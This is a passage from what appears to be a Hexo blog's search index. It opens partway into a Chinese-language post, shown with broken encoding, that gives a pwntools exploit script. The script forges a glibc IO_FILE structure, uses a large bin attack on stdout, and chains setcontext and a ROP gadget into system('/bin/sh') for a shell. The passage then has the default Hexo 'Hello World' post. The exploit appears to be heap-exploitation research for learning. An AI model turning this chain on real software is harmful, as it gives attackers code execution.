class="hljs-number">0x500</span>)<br><br>target_addr = libc.sym[<span class="hljs-string">&#x27;stdout&#x27;</span>]<br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc.address + <span class="hljs-number">0x10f75b</span> Â <span class="hljs-comment"># pop rdi ; ret</span><br><br><br>_IO_OVERFLOW = <span class="hljs-number">0x18</span><br>_IO_XSPUTN = <span class="hljs-number">0x38</span><br>_IO_UFLOW = <span class="hljs-number">0x28</span><br><br>data1 = flat(&#123;<br>Â  Â  <span class="hljs-number">0</span>: &#123;<br>Â  Â  Â  Â  <span class="hljs-number">0x88</span>: heap_base + <span class="hljs-number">0x300</span>, <span class="hljs-comment">#_lock</span><br>Â  Â  Â  Â  <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0xe0</span>, <span class="hljs-comment">#_wide_data</span><br>Â  Â  Â  Â  <span class="hljs-number">0xd8</span>: _IO_wfile_jumps + _IO_OVERFLOW - _IO_XSPUTN <span class="hljs-comment"># vtable</span><br>Â  Â  &#125;,<br>Â  Â  <span class="hljs-number">0xe0</span>: &#123;<span class="hljs-comment"># _wide_data-&gt;_wide_vtable</span><br>Â  Â  Â  Â  <span class="hljs-number">0</span>: heap_base + <span class="hljs-number">0x300</span>,<br>Â  Â  Â  Â  <span class="hljs-number">0x18</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_write_base</span><br>Â  Â  Â  Â  <span class="hljs-number">0x30</span>: <span class="hljs-number">0</span>, <span class="hljs-comment"># f-&gt;_wide_data-&gt;_IO_buf_base</span><br>Â  Â  Â  Â  (<span class="hljs-number">0x1c0</span>-<span class="hljs-number">0xe0</span>):<span class="hljs-number">0x1F80</span>,<br>Â  Â  Â  Â  <span class="hljs-number">0xe0</span>: fake_IO_FILE + <span class="hljs-number">0x200</span><br>Â  Â  &#125;,<br>Â  Â  <span class="hljs-number">0x200</span>: &#123;<br>Â  Â  Â  Â  <span class="hljs-number">0x38</span>: fake_IO_FILE + <span class="hljs-number">0x270</span>,<br>Â  Â  Â  Â  <span class="hljs-comment"># 0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]</span><br>Â  Â  Â  Â  <span class="hljs-number">0x68</span>: libc.address + <span class="hljs-number">0x176f0e</span><br>Â  Â  &#125;,<br>Â  Â  <span class="hljs-number">0x270</span>: &#123;<br>Â  Â  Â  Â  <span class="hljs-number">0x20</span>: libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>,<br>Â  Â  Â  Â  <span class="hljs-number">0x88</span>: <span class="hljs-number">0x7</span>,<br>Â  Â  Â  Â  <span class="hljs-number">0xa0</span>: fake_IO_FILE + <span class="hljs-number">0x270</span> + <span class="hljs-number">0xb0</span>,<br>Â  Â  Â  Â  <span class="hljs-number">0xa8</span>: pop_rdi_ret+<span class="hljs-number">1</span>,<br>Â  Â  &#125;,<br>Â  Â  <span class="hljs-number">0x270</span>+<span class="hljs-number">0xb0</span>:&#123;<br>Â  Â  Â  Â  <span class="hljs-number">0</span>: flat(<br>Â  Â  Â  Â  Â  Â  p64(pop_rdi_ret),p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))),<br>Â  Â  Â  Â  Â  Â  p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>Â  Â  Â  Â  )<br>Â  Â  &#125;,<br>&#125;,filler=<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>trimmed_data = data1[<span class="hljs-number">0x10</span>:]<br><br><span class="hljs-comment"># large bin attack</span><br>large_chunk1 = add(<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">0x600</span>)<br>large_chunk2 = add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x600</span>)<br>free(large_chunk1)<br>add(<span class="hljs-number">0x600</span>)<br>edit(large_chunk1, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">3</span> + p64(target_addr - <span class="hljs-number">0x20</span>))<br>edit(large_chunk2, trimmed_data)<br>free(large_chunk2)<br>pause()<br>add(<span class="hljs-number">0x600</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>ç»“æœï¼š<br><img src="/./post-1/2.png"></p><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>ç»è¿‡æµ‹è¯•ï¼Œ<code>printf</code>, <code>puts</code>, <code>putchar</code>ç­‰<code>stdout</code>ç›¸å…³çš„å‡½æ•°éƒ½å¯ä»¥é€šè¿‡ä¸€æ¬¡<code>large bin attack</code>å®Œæˆæ”»å‡»ã€‚ä½†å¦‚<code>scanf</code>, <code>getchar</code>ç­‰<code>stdin</code>ç›¸å…³çš„å‡½æ•°éƒ½è¦æ±‚<code>IO_FILE</code>ä¸­çš„<code>_IO_read_ptr</code>æ˜¯ä¸€ä¸ªå¯å†™åœ°å€ã€‚ç„¶è€Œå¯¹äºä¼ ç»Ÿçš„<code>large bin attack</code>è¾…åŠ©æ”»å‡»<code>IO_FILE</code>çš„æ‰‹æ®µæ¥è¯´ï¼Œè¿™ä¸ª0x8çš„åç§»ä½ç½®ä¸€èˆ¬éƒ½æ˜¯<code>chunk size</code>ï¼Œéœ€è¦æ›´å¤šçš„åŸè¯­æ‰èƒ½è¿›è¡Œåˆ©ç”¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>glibc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IO_FILE</tag>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/11/hello-world/"/>
    <url>/2025/02/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
